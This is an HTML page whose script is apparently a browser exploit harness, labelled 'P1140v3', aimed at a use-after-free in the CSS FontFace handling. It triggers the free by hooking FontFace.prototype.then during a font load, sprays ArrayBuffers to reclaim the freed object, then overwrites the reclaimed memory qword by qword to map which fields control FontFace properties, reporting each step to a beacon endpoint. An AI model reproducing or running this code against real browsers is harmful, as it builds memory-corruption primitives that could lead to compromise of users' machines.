<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1140v3</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
</head><body><div id="log"></div>
<script>
var L=document.getElementById('log');
function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}

log('phase','=== P1140v3: CSS FONTFACE PROPERTY ORACLE (multi-attempt) ===');
B('P1140V3-START','t='+Date.now());

var PROPS=['status','family','style','weight','stretch','unicodeRange',
           'variant','featureSettings','display'];

function readProps(face){
  var r={};
  for(var i=0;i<PROPS.length;i++){
    var p=PROPS[i];
    try{r[p]=String(face[p]).substring(0,80);}
    catch(e){r[p]='ERR:'+e.message.substring(0,60);}
  }
  return r;
}

function diffProps(a,b){
  var d=[];
  for(var i=0;i<PROPS.length;i++){
    var p=PROPS[i];
    if(a[p]!==b[p])d.push(p+':'+a[p]+'->'+b[p]);
  }
  return d;
}

// We need the CSS FontFace + UAF reclaim in one go
// Strategy: create @font-face, get its FontFace, then trigger UAF with heavier spray
var attempt=0;
var MAX_ATTEMPTS=5;

function tryAttempt(){
  attempt++;
  if(attempt>MAX_ATTEMPTS){
    B('P1140V3-DONE','all_attempts_missed');
    log('fail','All '+MAX_ATTEMPTS+' attempts missed UAF reclaim');
    return;
  }

  var r=Date.now()%100000+attempt*1111;
  var cssFace=null;
  var spray=[];
  var uafHit=false;

  // Create @font-face
  var st=document.createElement('style');
  st.textContent="@font-face{font-family:f"+r+";src:local(Arial);unicode-range:U+00"+(0x41+attempt).toString(16)+"}";
  document.head.appendChild(st);
  document.body.offsetHeight;

  // Get CSS FontFace reference
  document.fonts.forEach(function(face){
    try{if(face.family==='f'+r)cssFace=face;}catch(e){}
  });

  if(!cssFace){
    log('info','Attempt '+attempt+': CSS face not found, retrying...');
    B('P1140V3-SKIP','attempt='+attempt+'|reason=no_css_face');
    setTimeout(tryAttempt,10);
    return;
  }

  var beforeProps=readProps(cssFace);
  log('ok','Attempt '+attempt+': CSS face found ('+cssFace.family+', status='+cssFace.status+')');

  // Create JS FontFace trigger
  var ff=new FontFace('g'+r,'local(Helvetica)',{unicodeRange:'U+00'+(0x40+attempt).toString(16)});
  document.fonts.add(ff);void ff.loaded;

  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
    if(uafHit)return undefined;uafHit=true;
    if(st.parentNode)st.remove();
    try{document.fonts.delete(this);}catch(e){}
    document.body.offsetHeight;
    // Heavy spray
    for(var k=0;k<200;k++) spray.push(new ArrayBuffer(192));
    try{document.fonts.check('1em f'+r);}catch(e){}
    return undefined;
  },set:function(){}});

  document.fonts.load('1em g'+r+', f'+r,'AB').then(function(){},function(){});

  setTimeout(function(){
    delete FontFace.prototype.then;

    // Find UAF buffer
    var uafView=null;
    for(var k=0;k<spray.length;k++){
      var v=new BigUint64Array(spray[k]);
      if(v[0]===1n&&v[11]!==0n&&v[13]!==0n){
        var h=Number(v[11]>>32n);
        if(h>=0x10&&h<=0xFF){uafView=v;break;}
      }
    }

    if(!uafView){
      log('info','Attempt '+attempt+': no UAF reclaim, retrying...');
      B('P1140V3-RETRY','attempt='+attempt);
      setTimeout(tryAttempt,15);
      return;
    }

    log('ok','Attempt '+attempt+': UAF HIT! q11='+hex64(uafView[11]));
    B('P1140V3-HIT','attempt='+attempt+'|q11='+hex64(uafView[11])+'|q13='+hex64(uafView[13]));

    // Read after UAF (unmodified)
    var afterProps=readProps(cssFace);
    var dAfter=diffProps(beforeProps,afterProps);
    B('P1140V3-AFTER',JSON.stringify(afterProps));
    log('info','After UAF diffs: '+(dAfter.length>0?dAfter.join(', '):'none'));

    // Save originals
    var orig=[];
    for(var q=0;q<uafView.length;q++) orig.push(uafView[q]);

    // ===== TEST 1: Zero all memory =====
    for(var q=0;q<uafView.length;q++) uafView[q]=0n;
    var zeroProps=readProps(cssFace);
    var dZero=diffProps(afterProps,zeroProps);
    for(var q=0;q<orig.length;q++) uafView[q]=orig[q]; // restore

    B('P1140V3-ZERO',JSON.stringify(zeroProps));
    if(dZero.length>0){
      log('win','ZERO-FILL CHANGED PROPS: '+dZero.join(', '));
      B('P1140V3-ZDIFF',dZero.join('|'));
    }else{
      log('info','Zero-fill: no changes');
      B('P1140V3-ZDIFF','none');
    }

    // ===== TEST 2: Per-qword modification =====
    var fieldHits=[];
    for(var testQ=0;testQ<24;testQ++){
      for(var q=0;q<orig.length;q++) uafView[q]=orig[q];
      uafView[testQ]=0xDEADDEADDEADDEADn;

      for(var i=0;i<PROPS.length;i++){
        var p=PROPS[i];
        try{
          var val=String(cssFace[p]).substring(0,80);
          if(val!==afterProps[p]){
            fieldHits.push({q:testQ,prop:p,was:afterProps[p],now:val});
          }
        }catch(e){
          var estr='ERR:'+e.message.substring(0,60);
          if(afterProps[p]!==estr){
            fieldHits.push({q:testQ,prop:p,was:afterProps[p],now:estr});
          }
        }
      }
    }
    for(var q=0;q<orig.length;q++) uafView[q]=orig[q]; // restore

    if(fieldHits.length>0){
      log('win','FIELD MAPPING: '+fieldHits.length+' hits!');
      for(var i=0;i<fieldHits.length;i++){
        var h=fieldHits[i];
        log('win','  q'+h.q+' controls '+h.prop+': '+h.was+' -> '+h.now);
      }
      B('P1140V3-FIELDS',JSON.stringify(fieldHits.slice(0,15)));
    }else{
      log('info','No per-field property changes');
      B('P1140V3-FIELDS','none');
    }

    // ===== TEST 3: document.fonts API with zeroed memory =====
    for(var q=0;q<uafView.length;q++) uafView[q]=0n;
    var apiResults={};
    try{apiResults.has=String(document.fonts.has(cssFace));}
    catch(e){apiResults.has='ERR';}
    try{apiResults.check=String(document.fonts.check('1em f'+r));}
    catch(e){apiResults.check='ERR';}
    try{
      var cnt=0;document.fonts.forEach(function(f){cnt++;});
      apiResults.count=cnt;
    }catch(e){apiResults.count='ERR';}
    B('P1140V3-API',JSON.stringify(apiResults));
    for(var q=0;q<orig.length;q++) uafView[q]=orig[q];

    B('P1140V3-DONE','zero_diffs='+dZero.length+'|fields='+fieldHits.length);
    log('phase','=== DONE: '+dZero.length+' zero diffs, '+fieldHits.length+' field maps ===');
  },10);
}

tryAttempt();
</script></body></html>
